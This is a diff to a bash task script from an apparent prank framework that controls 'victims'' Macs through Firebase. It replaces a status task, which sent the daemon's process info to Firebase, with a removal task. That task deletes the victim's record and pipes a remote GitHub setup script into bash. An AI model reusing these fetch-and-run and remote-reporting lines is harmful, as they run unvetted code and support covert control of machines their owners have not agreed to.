@@ -6,7 +6,7 @@
 SCRIPTDIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
 
 # Define the task ID
-thisTaskID="status"
+thisTaskID="remove"
 
 # Get some default functions and variables from the deployment
 source "$SCRIPTDIR/deploy"
@@ -21,23 +21,13 @@ rootIteration="$2"
 
 ###############################################################################
 
-# Your own code
+# Delete this victim's data from firebase
 
-echo $SCRIPTDIR
+curl -X DELETE "https://${firebaseProject}.firebaseio.com/victims/$victim.json"
 
-dPID=`launchctl list | grep io.github.thiesgehrmann.arduinoPrank | cut -f1`
-psResult=`ps ux -p $dPID | tail -n1`
 
-curl -X PUT -d "
-  {
-    \"ps\" : \"$psResult\",
-    \"PID\" : \"$dPID\"
-  }" \
- "https://${firebaseProject}.firebaseio.com/victims/$victim/$thisTaskID.json"
+
+bash <(curl -s https://raw.githubusercontent.com/thiesgehrmann/arduinoPranks/master/websiteReactionPrank/setup) --clean
 
 ###############################################################################
 
-#Finally, you should sleep as well. Try not to use the computer's resources too much,
-# It is only a prank, after all.
-
-sleep 15
